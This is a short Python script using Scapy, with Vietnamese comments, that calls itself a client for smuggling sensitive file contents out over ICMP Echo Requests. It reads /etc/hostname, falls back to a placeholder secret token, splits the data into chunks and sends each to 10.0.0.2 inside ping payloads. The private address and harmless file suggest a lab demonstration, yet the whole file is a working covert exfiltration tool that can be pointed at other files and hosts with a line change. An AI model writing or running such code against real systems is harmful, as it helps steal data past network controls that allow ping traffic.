#!/usr/bin/env python3
# icmp_client.py - Máy khách tuồn nội dung tệp nhạy cảm (/etc/hostname) qua ICMP Echo Request
from scapy.all import IP, ICMP, sr1
import sys

target = "10.0.0.2"
chunk = 24

try:
    with open("/etc/hostname", "rb") as f:
        data = f.read().strip()
except Exception:
    data = b""

if not data:
    data = b"secret-token-ABC123"

print(f"[*] Target Server: {target}")
print(f"[*] Exfiltrating data ({len(data)} bytes): {data}")

total_chunks = (len(data) + chunk - 1) // chunk
for i in range(0, len(data), chunk):
    seg = data[i:i+chunk]
    seq_num = i // chunk
    print(f"[*] Sending chunk {seq_num + 1}/{total_chunks} ({len(seg)} bytes): {seg}...")
    ans = sr1(IP(dst=target) / ICMP(type=8, id=0x1337, seq=seq_num) / seg, timeout=2, verbose=0)
    if ans and ans.haslayer(ICMP):
        print(f"[client] phan hoi tu server: {bytes(ans[ICMP].payload)}")
    else:
        print(f"[-] No reply for chunk {seq_num}")

print("[client] hoan tat gui du lieu qua ICMP")

